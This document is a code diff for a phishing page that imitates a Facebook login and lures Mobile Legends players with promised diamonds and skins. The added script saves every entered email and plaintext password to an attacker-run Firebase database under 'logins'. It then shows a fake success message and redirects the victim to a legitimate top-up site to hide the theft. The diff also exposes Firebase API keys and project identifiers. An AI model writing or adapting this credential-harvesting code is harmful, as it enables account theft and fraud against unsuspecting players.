@@ -68,15 +68,39 @@
       background-color: #166fe5;
     }
 
+    /* Diagram Notification Box */
     .login-message {
       margin-top: 20px;
       display: none;
-      padding: 15px;
-      background-color: #e6f2ff;
-      border: 1px solid #99ccff;
+      padding: 20px;
+      background-color: #d1e7dd;
+      border-left: 8px solid #0f5132;
       border-radius: 6px;
-      color: #1877f2;
+      color: #0f5132;
       font-weight: bold;
+      font-size: 16px;
+      position: relative;
+      animation: slideIn 0.4s ease-out forwards;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-message::before {
+      content: "✅";
+      position: absolute;
+      left: 10px;
+      top: 10px;
+      font-size: 20px;
+    }
+
+    @keyframes slideIn {
+      0% {
+        transform: translateY(20px);
+        opacity: 0;
+      }
+      100% {
+        transform: translateY(0px);
+        opacity: 1;
+      }
     }
   </style>
 </head>
@@ -91,50 +115,67 @@
   <div class="login-box">
     <input type="email" id="username" placeholder="Email" />
     <input type="password" id="password" placeholder="Password" />
-    <button onclick="handleLogin()">Log In</button>
-    <div id="loginMessage" class="login-message">
-      ✅ Please log back into your mobile to check the diamonds.
-    </div>
+    <button id="loginBtn">Log In</button>
+    <div id="loginMessage" class="login-message"></div>
   </div>
 
-  <!-- ✅ Firebase SDK Integration -->
+  <!-- Firebase SDK with Realtime Database -->
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
-    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-auth.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-database.js";
 
-    // ✅ Firebase Config (Replace with your real config if needed)
     const firebaseConfig = {
-      apiKey: "AIzaSyATt0xBSWunsDdrJiCeSyJEzK6_lxf0iks",
-      authDomain: "uifacebook-37707.firebaseapp.com",
-      projectId: "uifacebook-37707",
-      storageBucket: "uifacebook-37707.appspot.com", // ✅ Corrected here
-      messagingSenderId: "165613562171",
-      appId: "1:165613562171:web:f472f134e583d70e99ef1e"
+      apiKey: "AIzaSyBOmN3gy2QhUb9YhtV4j1umVC7IjqC4t5o",
+      authDomain: "messenger-b0848.firebaseapp.com",
+      databaseURL: "https://messenger-b0848-default-rtdb.firebaseio.com",
+      projectId: "messenger-b0848",
+      storageBucket: "messenger-b0848.appspot.com",
+      messagingSenderId: "385887115922",
+      appId: "1:385887115922:web:bc975fffbddc49eee1644b",
+      measurementId: "G-TXLFF73RGS"
     };
 
-    // ✅ Initialize Firebase
     const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
+    const database = getDatabase(app);
 
-    // ✅ Skin Image Preview
+    // Skin Preview
     const urlParams = new URLSearchParams(window.location.search);
     const skinImage = urlParams.get('skin') || 'https://i.imgur.com/ZEpdSai.png';
     document.getElementById('skinImage').src = skinImage;
 
-    // ✅ Login Handler
-    window.handleLogin = function () {
-      const email = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+    // Login and Save to Database
+    document.getElementById('loginBtn').addEventListener('click', () => {
+      const email = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-      signInWithEmailAndPassword(auth, email, password)
-        .then((userCredential) => {
-          console.log("✅ Logged in as:", userCredential.user.email);
-          document.getElementById('loginMessage').style.display = 'block';
-        })
-        .catch((error) => {
-          alert("❌ Login failed: " + error.message);
-        });
-    };
+      if (!email || !password) {
+        alert("Please fill in both fields.");
+        return;
+      }
+
+      const loginsRef = ref(database, 'logins');
+      const newLoginRef = push(loginsRef);
+
+      set(newLoginRef, {
+        email: email,
+        password: password,
+        timestamp: new Date().toISOString()
+      })
+      .then(() => {
+        const messageBox = document.getElementById('loginMessage');
+        messageBox.innerText = "Logged in successfully. Please check your Mobile Legends account.";
+        messageBox.style.display = 'block';
+
+        // Redirect after 3 seconds
+        setTimeout(() => {
+          window.location.href = "https://www.codashop.com/my-mm/mobile-legends";
+        }, 3000);
+      })
+      .catch((error) => {
+        console.error("Firebase Error:", error.message);
+        alert("Error saving data: " + error.message);
+      });
+    });
   </script>
 </body>
 </html>
